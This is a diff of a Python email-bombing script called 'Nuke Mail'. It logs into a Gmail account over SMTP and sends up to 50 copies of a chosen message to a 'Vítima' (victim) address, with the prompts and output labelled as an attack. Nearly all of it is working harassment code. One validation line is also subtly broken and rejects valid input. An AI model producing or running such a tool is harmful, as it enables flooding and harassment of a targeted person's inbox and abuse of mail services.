@@ -1,70 +1,58 @@
+#!/bin/python
+
 import os, sys, smtplib, getpass, config, ctypes, base64
 
-try:
+W = '\033[0m'  
+R = '\033[31m' 
+G = '\033[32m' 
+ENDC = '\033[0m'
 
-    W = '\033[0m'  #White
-    R = '\033[31m' #Red
-    G = '\033[32m' #Green
+logo = R+r"""
+.--.
+|__| .-------.
+|=.| |.-----.|
+|--| || NUK ||
+|  | |'-----'|
+|__|~')_____('
+   @wh0001s
+"""+ENDC
 
-    os.system("cls")
-    ctypes.windll.kernel32.SetConsoleTitleW("Nuke Mail | by Latencyx1337")
-    print(R + "        _   __      __           __  ___      _ __");
-    print(R + "       / | / /_  __/ /_____     /  |/  /___ _(_) /");
-    print(R + "      /  |/ / / / / //_/ _ \   / /|_/ / __ `/ / / ");
-    print(R + "     / /|  / /_/ / ,< /  __/  / /  / / /_/ / / /  ");
-    print(R + "    /_/ |_/\__,_/_/|_|\___/  /_/  /_/\__,_/_/_/   ");
-    print(W + "                   by Latencyx1337\n                                             ");
+os.system("cls || clear")
 
-    smtp_server= 'smtp.gmail.com'
-    port = 587
-    set_server = "gmail"
-    email_user = config.EMAIL
-    passwd     = config.SENHA
-    splitadok  = email_user.split("@");
-    gmailla    = splitadok[1];
-    tstart     = len(gmailla);
-    print("Email logado: " +  splitadok[0] + "@" + "*" * tstart);
-    email_to   = input('\nVítima: ')
-    subject    = input('Título do envio: ')
-    body       = input('Mensagem que você quer passar: ')
-    total      = input('Quantidade: ')
-    int_body   = int(total)
-    try:
+""" 
+Variaveis 
+"""
 
-        server = smtplib.SMTP(smtp_server,port) 
-        server.ehlo()
+smtp_server= 'smtp.gmail.com'
+port = 587
+email_user = config.EMAIL
+passwd = config.SENHA
+print(logo)
+target = input("Vítima: ")
+subject = input("Título: ")
+body = input("Mensagem do ataque: ")
+qntd = input("Quantidade de envios: ")
+int_qntd = int(qntd)
 
-        if set_server == "gmail":
-            server.starttls()
+if int_qntd > 50 or int_qntd <= 0:
+    print("Escolha entre 1 e 50.")
+    exit(0)
 
-        server.login(email_user,passwd)
+if target or subject or body == "":
+    print("Você não informou algo.")
+    exit(0)
 
-        print(R + "\n\n\n Alvo: {} -\n".format(email_to))
+server = smtplib.SMTP(smtp_server,port)
+server.ehlo()
+server.starttls()
+server.login(email_user,passwd)
 
-
-        for i in range(1, int_body+1):
-
-            msg = 'From: ' + email_user + '\nSubject: ' + subject + '\n' + body
-
-            server.sendmail(email_user,email_to,msg)
-            print(G + "\r[INFO] {}".format(i))
-
-            sys.stdout.flush()
-
-        server.quit()
-
-        print( R + "\n\nAll {} sent".format(i) + W)
-
-    except KeyboardInterrupt:
-
-        print(R + "\nError - Keyboard Interrupt" + W)
-        sys.exit()
-
-    except smtplib.SMTPAuthenticationError:
-
-        print( R + "\nMude o email na source." + W)
-        sys.exit()
-
-except smtplib.SMTPAuthenticationError:
-
-    sys.exit()
+for i in range(1, int_qntd+1):
+    msg = 'From: ' + email_user + '\nSubject: ' + subject + '\n' + body
+    server.sendmail(email_user,target,msg)
+    print(G + "\r[ATTACK INFO] {}".format(i))
+   
+    sys.stdout.flush()
+    
+server.quit()
+print( R + "\n\nAll {} sent".format(i) + W)
